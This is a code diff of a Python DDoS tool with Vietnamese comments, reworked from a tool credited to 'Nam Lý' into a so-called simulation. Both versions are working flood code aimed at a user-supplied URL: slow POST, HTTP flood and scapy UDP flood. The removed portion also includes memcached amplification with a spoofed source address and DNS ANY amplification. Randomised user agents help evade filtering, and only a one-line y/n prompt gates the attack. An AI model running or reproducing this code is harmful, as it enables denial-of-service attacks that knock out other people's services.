@@ -8,27 +8,19 @@ import time
 import random
 import string
 import logging
+import json
 import socket
-import re
+import psutil
 from collections import defaultdict
 from datetime import datetime
 from urllib.parse import urlparse
 from scapy.all import *
 
-# Hiển thị tiêu đề công cụ
-print("""
-███╗   ██╗ █████╗ ███╗   ███╗    █████╗  ██╗
-████╗  ██║██╔══██╗████╗ ████║   ██╔══██ =██║
-██╔██╗ ██║███████║██╔████╔██║  ███████║ ██║
-██║╚██╗██║██╔══██║██║╚██╔╝██║ ██╔══██║ ██║
-██║ ╚████║██║  ██║██║ ╚═╝ ██║ ██║  ██║ ██║
-╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚═╝
-           DDoS Tool by Nam Lý
-----------------------------------------
-CẢNH BÁO: Chỉ sử dụng trong môi trường thử nghiệm được phép!
-""")
+# Cấu hình logging
+logging.basicConfig(filename='ddos_simulation.log', level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Module tự động cài đặt thư viện thiếu
+# Tự động cài đặt thư viện
 def install_package(package):
     try:
         importlib.import_module(package)
@@ -42,14 +34,9 @@ def install_package(package):
             logging.error(f"Failed to install {package}: {e}")
             sys.exit(1)
 
-# Kiểm tra và cài đặt các thư viện cần thiết
-required_packages = ["aiohttp", "scapy"]
+required_packages = ["aiohttp", "scapy", "psutil"]
 for package in required_packages:
     install_package(package)
-
-# Cấu hình logging
-logging.basicConfig(filename='namly_ddos.log', level=logging.INFO,
-                    format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Danh sách 200 User-Agent
 USER_AGENTS = [
@@ -605,243 +592,199 @@ ACCEPT_HEADERS = [
     "application/x-awk"
     ]
 
-# Biến toàn cục để đếm số liệu
-request_count = defaultdict(int)
-success_count = defaultdict(int)
-error_count = defaultdict(int)
-status_codes = defaultdict(lambda: defaultdict(int))
-bandwidth_usage = defaultdict(int)
-attack_start_time = time.time()
+# Module thống kê
+stats = defaultdict(int)
+stats_lock = threading.Lock()
+
+# Kiểm tra tài nguyên
+def check_resources():
+    cpu_usage = psutil.cpu_percent()
+    mem = psutil.virtual_memory()
+    if cpu_usage > 90 or mem.percent > 90:
+        logging.warning(f"High resource usage: CPU {cpu_usage:.1f}%, Memory {mem.percent:.1f}%")
+        return False
+    return True
 
 # Hàm tạo chuỗi ngẫu nhiên
-def generate_random_string(length):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+def random_string(length):
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
 
-# Hàm kiểm tra kết nối đến máy chủ
-async def check_server(host, port, timeout=5):
+# Hàm xác thực URL
+def is_valid_url(url):
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(timeout)
-        result = sock.connect_ex((host, port))
-        sock.close()
-        return result == 0
-    except socket.error as e:
-        logging.error(f"Server check failed: {e}")
+        result = urlparse(url)
+        return all([result.scheme in ["http", "https"], result.netloc])
+    except ValueError:
         return False
 
-# Hàm Slow POST Attack
-async def slow_post_attack(session, url, headers, max_retries=7):
-    global request_count, success_count, error_count, status_codes, bandwidth_usage
+# Hàm phân giải IP
+def resolve_ip(host):
     try:
-        payload = generate_random_string(100000)  # 100KB mỗi chunk
-        async with session.post(url, headers=headers, data=payload, chunked=True) as response:
-            for _ in range(500):  # 500 chunk
-                chunk = generate_random_string(100000)  # 100KB
-                await response.write(chunk.encode())
-                bandwidth_usage["slow_post"] += len(chunk)
-                await asyncio.sleep(0.01)  # Thời gian chờ 0.01 giây
-            status_codes["slow_post"][response.status] += 1
-            success_count["slow_post"] += 1
+        return socket.gethostbyname(host)
+    except socket.gaierror:
+        logging.error(f"Failed to resolve IP for {host}")
+        return None
+
+# Hàm kiểm tra kết nối
+async def check_server(ip, port, timeout=5):
+    try:
+        _, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
+        writer.close()
+        await writer.wait_closed()
+        return True
     except Exception as e:
-        error_count["slow_post"] += 1
+        logging.error(f"Server check failed for {ip}:{port}: {e}")
+        return False
+
+# Nhập mục tiêu
+async def input_targets():
+    targets = {
+        "web_targets": [],
+        "memcached_targets": [],
+        "dns_targets": []
+    }
+    while True:
+        url = input("Nhập URL mục tiêu web (http:// hoặc https://): ").strip()
+        if not is_valid_url(url):
+            print("URL không hợp lệ, thử lại.")
+            continue
+        parsed_url = urlparse(url)
+        host = parsed_url.hostname
+        ip = resolve_ip(host)
+        if not ip:
+            print(f"Không thể phân giải IP từ {host}, thử lại.")
+            continue
+        port = 443 if parsed_url.scheme == "https" else 80
+        if not await check_server(ip, port):
+            print(f"Không thể kết nối đến {ip}:{port}. Đảm bảo máy chủ đang chạy.")
+            continue
+        targets["web_targets"].append({"url": url, "ip": ip, "port": port})
+        print(f"Đã nhận diện: URL={url}, IP={ip}, Port={port}")
+        break
+    targets["memcached_targets"].append({"ip": ip, "port": 11211})
+    targets["dns_targets"].append({"ip": ip, "port": 53})
+    return targets
+
+# Tạo headers ngẫu nhiên
+def generate_headers():
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": random.choice(ACCEPT_HEADERS),
+        "Cache-Control": "no-cache",
+        "Content-Type": random.choice(["application/x-www-form-urlencoded", "application/json", "text/xml"]),
+        "Connection": "keep-alive"
+    }
+
+# Tạo payload ngẫu nhiên
+def generate_payload(size=10000):
+    payload_type = random.choice(["form", "json", "xml"])
+    if payload_type == "form":
+        return {"data": random_string(size)}
+    elif payload_type == "json":
+        return {"data": random_string(size), "id": random.randint(1, 10000)}
+    else:
+        return f"<data>{random_string(size)}</data>"
+
+# Slow POST bất đồng bộ
+async def slow_post(targets, session):
+    try:
+        target = random.choice(targets["web_targets"])
+        headers = generate_headers()
+        headers["Content-Length"] = str(50000)
+        async with session.post(target["url"], headers=headers, data="", chunked=True) as response:
+            for i in range(50):
+                chunk = random_string(1000).encode()
+                await response.write(chunk)
+                with stats_lock:
+                    stats["slow_post_requests"] += 1
+                    stats["bandwidth"] += len(chunk)
+                await asyncio.sleep(0.1)
+    except Exception as e:
         logging.error(f"Slow POST error: {e}")
-        if max_retries > 0:
-            await asyncio.sleep(2 ** (7 - max_retries) * 0.1)
-            await slow_post_attack(session, url, headers, max_retries - 1)
+        with stats_lock:
+            stats["errors"] += 1
 
-# Hàm HTTP Flood Attack
-async def http_flood_attack(session, url, headers, max_retries=7):
-    global request_count, success_count, error_count, status_codes, bandwidth_usage
+# HTTP Flood bất đồng bộ
+async def http_flood(targets, session):
     try:
-        params = {generate_random_string(10): generate_random_string(5000)}  # 5KB params
-        async with session.get(url, headers=headers, params=params) as response:
-            bandwidth_usage["http_flood"] += len(str(params))
-            status_codes["http_flood"][response.status] += 1
-            success_count["http_flood"] += 1
+        target = random.choice(targets["web_targets"])
+        headers = generate_headers()
+        params = {f"q{random.randint(1,1000)}": random_string(500)}
+        async with session.get(target["url"], headers=headers, params=params, timeout=15) as response:
+            with stats_lock:
+                stats["http_flood_requests"] += 1
+                stats["bandwidth"] += len(str(params))
     except Exception as e:
-        error_count["http_flood"] += 1
         logging.error(f"HTTP Flood error: {e}")
-        if max_retries > 0:
-            await asyncio.sleep(2 ** (7 - max_retries) * 0.1)
-            await http_flood_attack(session, url, headers, max_retries - 1)
+        with stats_lock:
+            stats["errors"] += 1
 
-# Hàm HTTP/2 Flood Attack
-async def http2_flood_attack(session, url, headers, max_retries=7):
-    global request_count, success_count, error_count, status_codes, bandwidth_usage
+# UDP Flood bất đồng bộ
+async def udp_flood(targets):
     try:
-        query = f"?q={generate_random_string(500)}"  # 500 byte query
-        async with session.get(url + query, headers=headers) as response:
-            bandwidth_usage["http2_flood"] += len(query)
-            status_codes["http2_flood"][response.status] += 1
-            success_count["http2_flood"] += 1
+        target = random.choice(targets["web_targets"])
+        packet = IP(dst=target["ip"])/UDP(dport=random.randint(1, 65535))/Raw(load=random_string(1500))
+        await asyncio.get_event_loop().run_in_executor(None, lambda: send(packet, verbose=False, count=50))
+        with stats_lock:
+            stats["udp_flood_packets"] += 50
+            stats["bandwidth"] += 1500 * 50
     except Exception as e:
-        error_count["http2_flood"] += 1
-        logging.error(f"HTTP/2 Flood error: {e}")
-        if max_retries > 0:
-            await asyncio.sleep(2 ** (7 - max_retries) * 0.1)
-            await http2_flood_attack(session, url, headers, max_retries - 1)
-
-# Hàm UDP Flood Attack
-async def udp_flood_attack(ip, port):
-    global request_count, success_count, error_count, bandwidth_usage
-    try:
-        packet = IP(dst=ip) / UDP(dport=port) / Raw(load=generate_random_string(100000))  # 100KB
-        send(packet, verbose=False)
-        bandwidth_usage["udp_flood"] += len(packet)
-        success_count["udp_flood"] += 1
-    except Exception as e:
-        error_count["udp_flood"] += 1
         logging.error(f"UDP Flood error: {e}")
+        with stats_lock:
+            stats["errors"] += 1
 
-# Hàm Encrypted Requests Attack
-async def encrypted_request_attack(session, url, headers, max_retries=7):
-    global request_count, success_count, error_count, status_codes, bandwidth_usage
-    try:
-        payload = {"data": generate_random_string(10000)}  # 10KB
-        async with session.post(url, headers=headers, json=payload, ssl=False) as response:
-            bandwidth_usage["encrypted_request"] += len(str(payload))
-            status_codes["encrypted_request"][response.status] += 1
-            success_count["encrypted_request"] += 1
-    except Exception as e:
-        error_count["encrypted_request"] += 1
-        logging.error(f"Encrypted Request error: {e}")
-        if max_retries > 0:
-            await asyncio.sleep(2 ** (7 - max_retries) * 0.1)
-            await encrypted_request_attack(session, url, headers, max_retries - 1)
-
-# Hàm Memcached Amplification Attack
-async def memcached_amplification(ip, port):
-    global request_count, success_count, error_count, bandwidth_usage
-    try:
-        packet = IP(dst=ip, src="112.11.11.11") / UDP(sport=random.randint(1024, 65535), dport=11211) / Raw(load=b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
-        send(packet, verbose=False)
-        bandwidth_usage["memcached_amplification"] += len(packet)
-        success_count["memcached_amplification"] += 1
-    except Exception as e:
-        error_count["memcached_amplification"] += 1
-        logging.error(f"Memcached Amplification error: {e}")
-
-# Hàm DNS Amplification Attack
-async def dns_amplification(ip, port):
-    global request_count, success_count, error_count, bandwidth_usage
-    try:
-        packet = IP(dst=ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
-        send(packet, verbose=False)
-        bandwidth_usage["dns_amplification"] += len(packet)
-        success_count["dns_amplification"] += 1
-    except Exception as e:
-        error_count["dns_amplification"] += 1
-        logging.error(f"DNS Amplification error: {e}")
-
-# Hàm chạy tấn công bất đồng bộ
-async def run_attack(url, ip, port, duration, num_tasks):
-    global request_count
-    connector = aiohttp.TCPConnector(limit=0, ssl=False)
-    timeout = aiohttp.ClientTimeout(total=40)
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        tasks = []
-        end_time = time.time() + duration
-        headers = {
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": random.choice(ACCEPT_HEADERS),
-            "Connection": "keep-alive"
+# Báo cáo chi tiết
+def generate_report():
+    with stats_lock:
+        report = {
+            "timestamp": str(datetime.now()),
+            "slow_post_requests": stats["slow_post_requests"],
+            "http_flood_requests": stats["http_flood_requests"],
+            "udp_flood_packets": stats["udp_flood_packets"],
+            "bandwidth_mb": stats["bandwidth"] / 1024 / 1024,
+            "errors": stats["errors"]
         }
-        while time.time() < end_time:
+        logging.info(json.dumps(report, indent=2))
+        with open("ddos_report.json", "w") as f:
+            json.dump(report, f, indent=2)
+
+# Chạy tấn công
+async def run_attack(targets, num_tasks):
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        while True:
+            if not check_resources():
+                await asyncio.sleep(1)
+                continue
             for _ in range(num_tasks):
-                attack_type = random.choice(["slow_post", "http_flood", "http2_flood", "udp_flood", "encrypted_request", "memcached_amplification", "dns_amplification"])
-                request_count[attack_type] += 1
+                attack_type = random.choice(["slow_post", "http_flood", "udp_flood"])
                 if attack_type == "slow_post":
-                    tasks.append(slow_post_attack(session, url, headers))
+                    tasks.append(slow_post(targets, session))
                 elif attack_type == "http_flood":
-                    for _ in range(100):  # 100 yêu cầu mỗi lần
-                        tasks.append(http_flood_attack(session, url, headers))
-                elif attack_type == "http2_flood":
-                    for _ in range(1000):  # 1000 yêu cầu mỗi lần
-                        tasks.append(http2_flood_attack(session, url, headers))
+                    for _ in range(50):
+                        tasks.append(http_flood(targets, session))
                 elif attack_type == "udp_flood":
-                    for _ in range(500):  # 500 gói tin mỗi lần
-                        tasks.append(udp_flood_attack(ip, port))
-                elif attack_type == "encrypted_request":
-                    for _ in range(80):  # 80 yêu cầu mỗi lần
-                        tasks.append(encrypted_request_attack(session, url, headers))
-                elif attack_type == "memcached_amplification":
-                    for _ in range(50):  # 50 gói tin mỗi lần
-                        tasks.append(memcached_amplification(ip, port))
-                elif attack_type == "dns_amplification":
-                    for _ in range(50):  # 50 gói tin mỗi lần
-                        tasks.append(dns_amplification(ip, port))
+                    tasks.append(udp_flood(targets))
             await asyncio.gather(*tasks, return_exceptions=True)
             tasks = []
-            await asyncio.sleep(0.01)  # Thời gian chờ giữa các batch
-
-# Hàm báo cáo
-def generate_report():
-    global request_count, success_count, error_count, status_codes, bandwidth_usage, attack_start_time
-    report = f"\nDDoS Attack Report - {datetime.now()}\n"
-    report += "=" * 50 + "\n"
-    total_requests = sum(request_count.values())
-    total_success = sum(success_count.values())
-    total_errors = sum(error_count.values())
-    duration = time.time() - attack_start_time
-    report += f"Total Duration: {duration:.2f} seconds\n"
-    report += f"Total Requests/Packets: {total_requests}\n"
-    report += f"Total Success: {total_success}\n"
-    report += f"Total Errors: {total_errors}\n"
-    report += f"Success Rate: {(total_success / total_requests * 100) if total_requests > 0 else 0:.2f}%\n"
-    report += "\nDetailed Statistics by Attack Type:\n"
-    for attack_type in request_count:
-        success_rate = (success_count[attack_type] / request_count[attack_type] * 100) if request_count[attack_type] > 0 else 0
-        report += f"\n{attack_type.replace('_', ' ').title()}:\n"
-        report += f"  Requests/Packets: {request_count[attack_type]}\n"
-        report += f"  Success: {success_count[attack_type]}\n"
-        report += f"  Errors: {error_count[attack_type]}\n"
-        report += f"  Success Rate: {success_rate:.2f}%\n"
-        report += f"  Bandwidth Usage: {bandwidth_usage[attack_type] / 1024 / 1024:.2f} MB\n"
-        report += "  Status Codes:\n"
-        for status, count in status_codes[attack_type].items():
-            report += f"    {status}: {count}\n"
-    report += "=" * 50 + "\n"
-    with open("namly_ddos_report.txt", "w") as f:
-        f.write(report)
-    print(report)
+            await asyncio.sleep(0.1)
+            generate_report()
 
 # Hàm chính
 async def main():
-    # Nhập thông tin từ người dùng
-    url = input("Nhập URL mục tiêu (http:// hoặc https://): ").strip()
-    port = int(input("Nhập port (1-65535, để trống để tự động): ") or (443 if url.startswith("https") else 80))
-    if not 1 <= port <= 65535:
-        print("Port không hợp lệ! Thoát...")
-        return
-    duration = int(input("Nhập thời gian tấn công (giây): "))
-    num_tasks = int(input("Nhập số lượng tác vụ (tối thiểu 1000): "))
+    print("Mô phỏng DDoS bắt đầu. Nhấn Ctrl+C để dừng.")
+    targets = await input_targets()
+    num_tasks = int(input("Nhập số tác vụ (tối thiểu 1000): ") or 1000)
     if num_tasks < 1000:
         num_tasks = 1000
-
-    # Phân tích URL
-    parsed_url = urlparse(url)
-    host = parsed_url.hostname
-    ip = socket.gethostbyname(host)
-    print(f"Mục tiêu: {host} ({ip}:{port})")
-
-    # Kiểm tra kết nối
-    if not await check_server(ip, port):
-        print(f"Không thể kết nối đến {ip}:{port}. Thoát...")
-        return
-
-    # Chạy tấn công
-    print(f"Bắt đầu tấn công {url} trong {duration} giây với {num_tasks} tác vụ...")
-    await run_attack(url, ip, port, duration, num_tasks)
-    generate_report()
-    print("Tấn công hoàn tất! Báo cáo được lưu tại namly_ddos_report.txt")
-
-# Chạy chương trình
-if __name__ == "__main__":
     try:
-        asyncio.run(main())
+        await run_attack(targets, num_tasks)
     except KeyboardInterrupt:
-        print("\nTấn công bị gián đoạn bởi người dùng!")
+        print("\nĐã dừng mô phỏng.")
         generate_report()
-    except Exception as e:
-        logging.error(f"Main error: {e}")
-        print(f"Đã xảy ra lỗi: {e}")
+
+if __name__ == "__main__":
+    if input("Chạy trong môi trường được phép? (y/n): ").lower() != 'y':
+        print("Hủy mô phỏng.")
+        sys.exit(1)
+    asyncio.run(main())
